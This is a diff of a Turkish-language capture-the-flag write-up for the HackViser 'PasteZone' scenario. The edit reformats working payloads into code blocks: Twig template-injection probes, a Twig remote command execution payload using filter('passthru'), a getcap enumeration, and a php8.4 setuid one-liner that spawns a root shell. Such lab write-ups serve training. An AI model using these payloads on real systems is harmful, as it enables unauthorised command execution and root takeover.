@@ -42,7 +42,11 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
 - Search kısmında sqlmap ve manuel zafiyet araştırması yapıldıysa sonuç alınamadı.
 - Post kısmında stored XSS tahmini ile araştırmalar yapıldı ve sonuç alınamadı.
 - Yazdığımız metinlerin arkada sınıflandırıldığını fark ettik. Yazdığımızın JS olduğunu anlayan bir şablon motoru çalışıyor.
-- SSTI zafiyetini kanıtlamak için `{{7*7}}` yazıp post attık ve sonuç 49 döndü.
+- SSTI zafiyetini kanıtlamak için yazıp post attık ve sonuç 49 döndü.
+
+```
+{{7*7}}
+```
 
  ![SSTI testi](image3.png?v=1)
 
@@ -65,10 +69,19 @@ Görevin; bu paylaşımdan sorumlu kişi ya da grupları tespit etmek, PasteZone
   - `{{ ''.__class__.__mro__ }}` works → Jinja2
   - `{{ constant('PHP_VERSION') }}` works → Twig
 
+```
+{{ ''.__class__.__mro__ }}
+{{ constant('PHP_VERSION') }}
+```
+
 - Aradığımız motor Twig çıktı.
 
 - Artık sistem içerisinde gezinmeye başlamalıyız, uygun payloadı hazırlayalım.
-- Birkaç denemeden sonra `{{['whoami']|filter('passthru')}}` payloadı ile sistemi dışarı taşıyabildik.
+- Birkaç denemeden sonra payloadı ile sistemi dışarı taşıyabildik.
+
+```
+{{['whoami']|filter('passthru')}}
+```
 - Çıkarımlar: Sistemde komut çalışırsa ya cevap gelir ya da boş ekran, payload çalışmazsa olumsuz payloadı görürsünüz. WWW-data kullanıcısıyız.
 
 #### İletme (Delivery) & Sömürme (Exploitation):
@@ -124,11 +137,19 @@ CREATE TABLE notes (
 
 #### Etki Yükseltme (Privilege Escalation):
 - Sistemde daha fazla gezemediğimiz için yetkileri kontrol ettik ve root olmamız gerektiğini anladık.
-- Root olmak için `getcap -r / 2>/dev/null` komutuyla şansımızı deneyeceğimiz alanı belirledik.
+- Root olmak için komutuyla şansımızı deneyeceğimiz alanı belirledik.
+
+```
+getcap -r / 2>/dev/null
+```
 
  ![Getcap çıktısı](image7.png?v=1)
 
-- Çıktıdan bakınca zafiyetimiz anlaşılıyor ve `php8.4 -r "posix_setuid(0); system('/bin/bash');"` komutuyla root oluyoruz. 
+- Çıktıdan bakınca zafiyetimiz anlaşılıyor ve komutuyla root oluyoruz.
+
+```
+php8.4 -r "posix_setuid(0); system('/bin/bash');"
+``` 
 
 ![Root erişimi](image8.png?v=1)
 
@@ -173,7 +194,3 @@ drwxr-xr-x  3 root root 4096 Dec 27  2024 .local
 - Privilege escalation yöntemleri (getcap kullanımı).
 - Veritabanı analizi ve IP adresi çıkarımı.
 
-## Notlar
-- Resimler rapor içine gömülmüştür ve GitHub'da görüntülenecektir.
-- img2 mevcut olmadığı için atlandı.
-- Bu rapor HackViser PasteZone senaryosu için hazırlanmıştır.
